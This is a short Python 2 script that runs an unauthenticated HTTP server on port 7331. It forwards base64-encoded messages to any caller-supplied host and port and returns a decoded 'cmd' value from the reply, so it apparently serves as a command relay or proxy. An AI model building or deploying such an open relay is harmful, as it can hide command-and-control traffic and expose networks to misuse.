from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import httplib
import ast
from json import dumps
from os import system
from urllib2 import urlopen

ADDR = "0.0.0.0"
PORT = 7331

class RequestHandler(BaseHTTPRequestHandler):    
    def do_POST(self):
        length = int(self.headers['Content-length'])
        flow = ast.literal_eval(self.rfile.read(length))["text"].split()
        sip, port, msg = flow[0].decode('base64','strict'), flow[1].decode('base64','strict'), flow[2].decode('base64','strict')
        self.send_response(200, "OK")
        self.end_headers()
        conn = httplib.HTTPConnection(sip + ":" + port)
        conn.request("POST", "/", msg)
        pre_resp = ((conn.getresponse()).read()).split()
        f_resp = dumps({"status":[False, True][pre_resp[0] == "1"], "cmd":pre_resp[1].decode('base64','strict')})
        self.wfile.write(f_resp)
        conn.close()
        

httpd = HTTPServer((ADDR, PORT), RequestHandler)
httpd.serve_forever()